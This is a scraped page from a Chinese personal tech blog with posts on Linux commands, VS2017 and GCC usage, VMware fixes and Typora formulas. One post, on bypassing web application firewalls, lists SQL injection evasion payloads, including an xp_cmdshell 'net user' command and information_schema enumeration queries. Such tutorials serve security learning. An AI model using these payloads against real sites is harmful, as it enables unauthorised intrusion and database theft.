<h2 id="2-5-查找类命令"><a href="#2-5-查找类命令" class="headerlink" title="2.5 查找类命令"></a>2.5 查找类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//1. 查找文件or 目录</span><br><span class="line">find 查找路径 -name 文件名</span><br><span class="line">find /root/ -name install.log //查找是否存在</span><br><span class="line">//2. 查找字符串(部分文件名)</span><br><span class="line">//正则表达式查找</span><br><span class="line">//grep (global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来)是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</span><br><span class="line">grep &quot;字符串&quot; 路径 [option]</span><br><span class="line">grep &quot;hello&quot; ./ -rn     //当前路径下查找包含字符串hello的文件</span><br><span class="line">grep &quot;he*&quot;   ./ -rn     //当前路径下查找字符串hello开头的文件</span><br></pre></td></tr></table></figure>



<h2 id="2-6-进程管理类命令"><a href="#2-6-进程管理类命令" class="headerlink" title="2.6 进程管理类命令"></a>2.6 进程管理类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//1.查看进程</span><br><span class="line">ps [选项]</span><br><span class="line">ps aux </span><br><span class="line"></span><br><span class="line">//2.杀死进程 kill</span><br><span class="line">kill 进程ID </span><br><span class="line"></span><br><span class="line">//3.查看内存</span><br><span class="line">free</span><br><span class="line">//4.CPU占有率 </span><br><span class="line">top</span><br></pre></td></tr></table></figure>



<h2 id="2-7-杂项命令"><a href="#2-7-杂项命令" class="headerlink" title="2.7 杂项命令"></a>2.7 杂项命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//1.软件管理</span><br><span class="line">rpm[option][软件包]</span><br><span class="line"></span><br><span class="line">rpm -ivh i686.rpm //install</span><br><span class="line">rpm -qa //查看系统中安装的所有软件包</span><br><span class="line">rpm -e i686 //uninstall，无后缀</span><br><span class="line"></span><br><span class="line">//2.管道操作</span><br><span class="line">命令1 | 命令2</span><br><span class="line">rpm -qa|grep tar     //分步执行，命令1的输出作为命令2的输入</span><br><span class="line">//查询所有安装包 ，并筛选出含有字符串tar的</span><br><span class="line"></span><br><span class="line">//3.查看帮助！！！</span><br><span class="line">//系统文档是最好的学习工具！</span><br><span class="line">man 命令名</span><br><span class="line">man find //查看命令用法</span><br><span class="line"></span><br><span class="line">//4.关机</span><br><span class="line">shutdown [option] time</span><br><span class="line">shutdown now</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/05/21/2018-05-21-vs%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/05/21/2018-05-21-vs%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">VS问题汇总</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-05-21 00:00:00" itemprop="dateCreated datePublished" datetime="2018-05-21T00:00:00+08:00">2018-05-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>记录自己使用VS2017过程中遇到的一些问题</p>
<h3 id="0x01-使用不安全的函数"><a href="#0x01-使用不安全的函数" class="headerlink" title="0x01  使用不安全的函数"></a>0x01  使用不安全的函数</h3><p>当使用不安全的函数时，会报错如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error C4996: <span class="string">&#x27;scanf&#x27;</span>: This function <span class="keyword">or</span> variable may be unsafe. Consider <span class="keyword">using</span> scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure>

<p>原因</p>
<blockquote>
<p>那些C库的函数，很多函数内部是不进行参数检测的（包括越界类的），微软担心使用这些会造成内存异常，所以就改写了同样功能的函数，改写了的函数进行了参数的检测，使用这些新的函数会更安全和便捷。</p>
</blockquote>
<p>解决方案：</p>
<ul>
<li><p>将报错函数替换为Security CRT functions（一般都是在其添加_s后缀，如<code>scanf</code>改为<code>scanf_s</code>）</p>
</li>
<li><p>屏蔽警告（注意是屏蔽报错，但是程序存在危险）</p>
<ul>
<li><p>在预编译头文件stdafx.h里（注意：一定要在没有include任何头文件之前）定义下面的宏：  <code>#define _CRT_SECURE_NO_DEPRECATE</code></p>
</li>
<li><p>更改预处理定义：项目-&gt;属性-&gt;配置属性-&gt;C/C++ -&gt; 预处理器 -&gt; 预处理器定义，增加<code>_CRT_SECURE_NO_DEPRECATE</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="0x02-VS控制台窗口自动关闭"><a href="#0x02-VS控制台窗口自动关闭" class="headerlink" title="0x02 VS控制台窗口自动关闭"></a>0x02 VS控制台窗口自动关闭</h3><ul>
<li><p>代码结束前添加一句 <code>system(&quot;pause&quot;);</code></p>
<p>需要头文件<code>#include&lt;stdlib.h&gt;</code></p>
</li>
<li><p>设置断点</p>
</li>
<li><p>在VS中配置 项目属性-&gt;链接器-&gt;系统-&gt;子系统设为：控制台(/SUBSYSTEM:CONSOLE)，然后用ctrl+F5运行（不调试运行）</p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/05/12/2018-05-12-GCC%E7%BC%96%E8%AF%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/05/12/2018-05-12-GCC%E7%BC%96%E8%AF%91/" class="post-title-link" itemprop="url">GCC编译</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-05-12 00:00:00" itemprop="dateCreated datePublished" datetime="2018-05-12T00:00:00+08:00">2018-05-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、GCC简介"><a href="#一、GCC简介" class="headerlink" title="一、GCC简介"></a>一、GCC简介</h1><h5 id="1-1-GCC特点"><a href="#1-1-GCC特点" class="headerlink" title="1.1 GCC特点"></a>1.1 GCC特点</h5><p>Gcc（GNU C Compiler）是GNU推出的功能强大、性能优越的多平台编译器，是GNU的<br>代表作之一。Gcc可以在多种硬体平台上编译出可执行程序，其执行效率与一般的编译器<br>相比平均效率要高20%~30%。</p>
<h5 id="1-2-Gcc基本用法"><a href="#1-2-Gcc基本用法" class="headerlink" title="1.2 Gcc基本用法"></a>1.2 Gcc基本用法</h5><p>Gcc最基本的用法是∶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc [options] filenames</span><br><span class="line">options：编译器所需要的编译选项</span><br><span class="line">filenames: 要编译的文件名</span><br></pre></td></tr></table></figure>



<h1 id="二、GCC程序产生过程"><a href="#二、GCC程序产生过程" class="headerlink" title="二、GCC程序产生过程"></a>二、GCC程序产生过程</h1><p><img src="https://yuane.oss-cn-beijing.aliyuncs.com/img/2019/20200212171601.png"></p>
<h1 id="三、GCC文件后缀"><a href="#三、GCC文件后缀" class="headerlink" title="三、GCC文件后缀"></a>三、GCC文件后缀</h1><p>Gcc通过后缀来区别输入文件的类别，常见类型有：</p>
<ul>
<li>.c为后缀的文件: C语言源代码文件</li>
<li>.a为后缀的文件: 是由目标文件构成的库文件</li>
<li>.C，.cc或.cxx 为后缀的文件: 是C++源代码文件</li>
<li>.h为后缀的文件: 头文件</li>
<li>.o为后缀的文件: 是编译后的目标文件</li>
<li>.s为后缀的文件: 是汇编语言源代码文件</li>
</ul>
<h1 id="四、GCC常见编译选项"><a href="#四、GCC常见编译选项" class="headerlink" title="四、GCC常见编译选项"></a>四、GCC常见编译选项</h1><h5 id="o-output-filename"><a href="#o-output-filename" class="headerlink" title="-o output_filename"></a>-o output_filename</h5><p>确定可执行文件的名称为output_filename。如果不给出这个选项，gcc就<br>给出预设的可执行文件a.out。</p>
<h5 id="O-大写O-，程序优化"><a href="#O-大写O-，程序优化" class="headerlink" title="-O (大写O ，程序优化)"></a>-O (大写O ，程序优化)</h5><ul>
<li>-O，对程序进行优化编译、链接，采用这个选项，整个源代码会在编译、连接过程中进行<br>优化处理，这样产生的可执行文件的执行效率可以提高，但是编译、连接的速度就相应地要慢一些。</li>
<li>-O2，比-O更好的优化编译、连接，当然整个编译、连接过程会更慢。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//比较运行结果</span><br><span class="line">1. gcc optimize.c -o optimize</span><br><span class="line">time ./optimize</span><br><span class="line">2. gcc –O optimize.c -o optimize</span><br><span class="line">time ./optimize</span><br></pre></td></tr></table></figure>

<h5 id="c：不链接。编译器只是由输入的-c等源代码"><a href="#c：不链接。编译器只是由输入的-c等源代码" class="headerlink" title="-c：不链接。编译器只是由输入的.c等源代码"></a>-c：不链接。编译器只是由输入的.c等源代码</h5><p>文件编译生成.o为后缀的中间文件。</p>
<h5 id="g："><a href="#g：" class="headerlink" title="-g："></a>-g：</h5><p>产生调试工具(GNU的gdb)所需要的符号信息，要想对编译出的程序进行调试，就必须加入这个选项</p>
<h5 id="I-dirname"><a href="#I-dirname" class="headerlink" title="-I dirname:"></a>-I dirname:</h5><p>将dirname所指出的目录作为编译器寻找头文件的标<br>准路径。<br>C程序中的头文件包含两种情况∶</p>
<ul>
<li><h1 id="include-lt-A-h-gt"><a href="#include-lt-A-h-gt" class="headerlink" title="include &lt;A.h&gt;"></a>include &lt;A.h&gt;</h1></li>
<li><h1 id="include-“B-h”"><a href="#include-“B-h”" class="headerlink" title="include “B.h”"></a>include “B.h”</h1></li>
<li><p>尖括号和引号的区别</p>
</li>
</ul>
<p>对于&lt;&gt;，gcc在系统预设的头文件目录(如/usr/include)中搜寻<br>相应的文件；而对于””，gcc在当前目录中搜寻头文件。<br>-I选项的作用是告诉gcc，如果在当前目录中没有找到需要的文件，就到指定的dirname目录中去寻找(批量添加自定义头文件路径)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg：gcc hello.c -I /home/Louis/Desktop -o hello</span><br></pre></td></tr></table></figure>

<h5 id="编译警告"><a href="#编译警告" class="headerlink" title="编译警告"></a>编译警告</h5><p>编译错误与编译警告都是我们的程序设计中经常遇到的问题. 编译错误一般是代码中出现语法错误，程序无法编译执行，必须修改. 编译警告是编译器发现程序中不合理的地方（比如类型不匹配），建议最好修改，但不修改也可以编译执行。</p>
<ul>
<li>-Wall：生成所有警告信息</li>
<li>-w：不生成任何警告信息</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/04/26/2018-04-26-VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/04/26/2018-04-26-VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">VMware虚拟机问题汇总</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-04-26 00:00:00" itemprop="dateCreated datePublished" datetime="2018-04-26T00:00:00+08:00">2018-04-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="域名无法解析-解析失败"><a href="#域名无法解析-解析失败" class="headerlink" title="域名无法解析/解析失败"></a>域名无法解析/解析失败</h3><p>进入/etc/resolv.conf</p>
<p>修改内容如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver 8.8.8.8<span class="comment">#google域名服务器</span></span><br></pre></td></tr></table></figure>

<p>也可以使用阿里的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver 223.5.5.5</span><br><span class="line"></span><br><span class="line">nameserver 223.6.6.6</span><br></pre></td></tr></table></figure>

<p>修改后重启即可</p>
<h3 id="虚拟机启动后黑屏"><a href="#虚拟机启动后黑屏" class="headerlink" title="虚拟机启动后黑屏"></a>虚拟机启动后黑屏</h3><p>挂起时正常显示，开机黑屏</p>
<p>两种解决方法</p>
<ul>
<li>管理员权限cmd输入<code>netsh winsock reset</code>   然后重启</li>
<li><code>VM-&gt;Settings-&gt;Hardware-&gt;Display</code>在右面的内容栏中将<code>Accelerate 3D graphics </code>取消打勾，然后重启即可</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/04/15/2018-04-15-typora%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/04/15/2018-04-15-typora%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/" class="post-title-link" itemprop="url">typora插入数学公式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-04-15 00:00:00" itemprop="dateCreated datePublished" datetime="2018-04-15T00:00:00+08:00">2018-04-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x01-行间公式"><a href="#0x01-行间公式" class="headerlink" title="0x01    行间公式"></a>0x01    行间公式</h3><ul>
<li>在typora中点击 段落–&gt;公式块</li>
<li>“$$”+回车</li>
<li>快捷键 Crtl+Shift+m</li>
</ul>
<p>三种方式均可</p>
<p>打开之后如下图：</p>
<p><img src="https://yuane.oss-cn-beijing.aliyuncs.com/img/2019/20190712201929.png"></p>
<h3 id="0x02-行内公式"><a href="#0x02-行内公式" class="headerlink" title="0x02    行内公式"></a>0x02    行内公式</h3><p>typora默认没有开启，需要手动开启(我是没有开启的状态)</p>
<p>点击    文件–&gt;偏好设置–&gt;选择扩展语法中的内联公式 </p>
<p><img src="https://yuane.oss-cn-beijing.aliyuncs.com/img/2019/20190712202158.png"></p>
<p>这样就开启了行内公式的特性支持</p>
<p>使用方法：在两个$中间填写数学公式，比如<code>$a^2$</code></p>
<p>效果：</p>
<p><img src="https://yuane.oss-cn-beijing.aliyuncs.com/img/2019/20190712203638.png"></p>
<h3 id="0x03-数学公式"><a href="#0x03-数学公式" class="headerlink" title="0x03 数学公式"></a>0x03 数学公式</h3><p>关于数学公式的写法这里不详细介绍，推荐一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/mingzhuo_126/article/details/82722455">链接</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/04/08/2018-04-08-%E7%BB%95WAF%E7%9A%84%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/04/08/2018-04-08-%E7%BB%95WAF%E7%9A%84%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">绕WAF的方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-04-08 00:00:00" itemprop="dateCreated datePublished" datetime="2018-04-08T00:00:00+08:00">2018-04-08</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="绕过WAF的9种方法"><a href="#绕过WAF的9种方法" class="headerlink" title="绕过WAF的9种方法"></a>绕过WAF的9种方法</h1><p>web应用程序防火墙(或WAF)是一种过滤器、监视器，并从web应用程序阻塞HTTP流量。WAF与常规防火墙的区别在于，WAF能够过滤特定web应用程序的内容，而常规防火墙充当服务器之间的安全通道。通过检查HTTP流量，它可以防止来自web应用程序安全缺陷的攻击，例如SQL注入、跨站点脚本(XSS)、文件包含和安全性错误配置。</p>
<h1 id="WAF种类"><a href="#WAF种类" class="headerlink" title="WAF种类"></a>WAF种类</h1><ul>
<li>异常检测协议（Exception Detection Protocol）：拒绝不符合HTTP标准的请求</li>
<li>增强输入验证（Enhanced input validation）：加入代理和服务器端验证，而不仅仅是用户端验证</li>
<li>黑名单（Blacklist）/白名单（WhiteList）</li>
<li>基于规则和异常的保护机制（Rule-based and exception-based protection）：更多通过规则结合基于黑名单的机制，基于异常的更加灵活</li>
<li>国家管理（State management）：关注session保护，也包括Cookies技术保护，反入侵技术保护，响应监控和信息披露保护</li>
</ul>
<h1 id="WAF绕过方法"><a href="#WAF绕过方法" class="headerlink" title="WAF绕过方法"></a>WAF绕过方法</h1><h2 id="1-大小写混淆-Mixed-Case"><a href="#1-大小写混淆-Mixed-Case" class="headerlink" title="1.大小写混淆(Mixed Case)"></a>1.大小写混淆(Mixed Case)</h2><p>将会触发WAF保护的恶意输入词修改进行大小写混淆，比如union可以变成uNIoN，如果WAF是基于黑名单的恶意词过滤，那这么做就可以绕过过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h2 id="2-替代关键字-Replace-the-keyword"><a href="#2-替代关键字-Replace-the-keyword" class="headerlink" title="2.替代关键字(Replace the keyword)"></a>2.替代关键字(Replace the keyword)</h2><p>在目标关键词中插入将被WAF删除的特殊字符，比如SELECT可以变成SELselectECT，一旦会被删除的字符被删除，正常字符就会被传递，这样就能绕过过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/index.php?page_id=-15&amp;nbsp;UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h2 id="3-编码-Encode"><a href="#3-编码-Encode" class="headerlink" title="3.编码(Encode)"></a>3.编码(Encode)</h2><p>+URL编码：<code>page.php?id=1%252f%252a*/UNION%252f%252a /SELECT</code><br>+Hex编码：<code>target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4</code><br>+Unicode编码：<code>?id=10%D6‘%20AND%201=2%23</code></p>
<h2 id="4-使用注释-Use-comments"><a href="#4-使用注释-Use-comments" class="headerlink" title="4.使用注释(Use comments)"></a>4.使用注释(Use comments)</h2><p>在攻击字符串中插入注释。比如，/<em>!SELECT</em>/可能会被WAF忽略，但是会被传递到目标应用程序并由mysql数据库处理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3,4</span><br></pre></td></tr></table></figure>

<h2 id="5-等效函数和命令-Equivalent-functions-and-commands"><a href="#5-等效函数和命令-Equivalent-functions-and-commands" class="headerlink" title="5.等效函数和命令(Equivalent functions and commands)"></a>5.等效函数和命令(Equivalent functions and commands)</h2><p>一些函数或命令不能被使用，因为这些关键字被检测到，但在许多情况下，我们可以使用相同或类似的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"> substr((select &#x27;password&#x27;),1,1) = 0x70</span><br><span class="line">　　　strcmp(left(&#x27;password&#x27;,1), 0x69) = 1</span><br><span class="line">　　  strcmp(left(&#x27;password&#x27;,1), 0x70) = 0</span><br><span class="line">　　　strcmp(left(&#x27;password&#x27;,1), 0x71) = -1</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>

<h2 id="6-特殊符号-Special-symbols"><a href="#6-特殊符号-Special-symbols" class="headerlink" title="6.特殊符号(Special symbols)"></a>6.特殊符号(Special symbols)</h2><p>这里我有一些特殊符号的非字母数字字符种类，特殊符号往往具有特殊的意义和用法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">· &#x27;  符号: select &#x27;version()&#x27;;</span><br><span class="line">· +- 符号: select+id-1+1.from users;</span><br><span class="line">· @  符号: select@^1.from users;</span><br><span class="line">· mysql函数xxx</span><br><span class="line">· `、~、!、@、%、()、[]、.、-、+ 、|、%00</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;se&#x27;+&#x27;lec&#x27;+&#x27;t&#x27;</span><br><span class="line">%S%E%L%E%C%T 1</span><br><span class="line">1.aspx?id=1;EXEC(&#x27;ma&#x27;+&#x27;ster..x&#x27;+&#x27;p_cm&#x27;+&#x27;dsh&#x27;+&#x27;ell &quot;net user&quot;&#x27;)&#x27;or --+2=- -!!!&#x27;2</span><br><span class="line">id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure>

<h2 id="7-HTPP参数控制-HTTP-parameter-control"><a href="#7-HTPP参数控制-HTTP-parameter-control" class="headerlink" title="7.HTPP参数控制(HTTP parameter control)"></a>7.HTPP参数控制(HTTP parameter control)</h2><p>提供多个相同名称的参数，以混淆WAF。比如<code>http://example.com?id=1&amp;?id = 1&#39; or &#39;1&#39; = &#39;1&#39; --</code>在某些情况下,例如Apache / PHP应用程序只会解析的最后的id =…，而WAF只会解析第一个。它不是一个合法的请求，但应用程序仍然接收和处理恶意输入。大多数WAF的今天都不容易受到HTTP参数污染(HPP)的影响，但是在构建绕过语句时仍然值得一试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?id=1;select+1,2,3+from+users+where+id=1—</span><br><span class="line">/?id=1;select+1&amp;amp;id=2,3+from+users+where+id=1—</span><br><span class="line">/?id=1/**/union/*&amp;amp;id=*/select/*&amp;amp;id=*/pwd/*&amp;amp;id=*/from/*&amp;amp;id=*/users</span><br></pre></td></tr></table></figure>

<h2 id="8-缓冲区溢出-Buffer-overflow"><a href="#8-缓冲区溢出-Buffer-overflow" class="headerlink" title="8.缓冲区溢出(Buffer overflow)"></a>8.缓冲区溢出(Buffer overflow)</h2><p>WAF的应用程序和其他应用程序一样容易受到软件缺陷的影响。如果缓冲区溢出条件可能导致崩溃，即使它不会导致代码执行，这可能导致WAF失败。换句话说，也是一种绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure>

<h2 id="9-集成（Integration）"><a href="#9-集成（Integration）" class="headerlink" title="9.集成（Integration）"></a>9.集成（Integration）</h2><p>集成意味着使用多种绕过技术，一种技术可能无法绕过过滤机制，但是使用多种技术的可能性会增加很多。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</span><br><span class="line">id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line">?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/03/21/2018-03-21-leetcode%E8%84%91%E7%AD%8B%E6%80%A5%E8%BD%AC%E5%BC%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
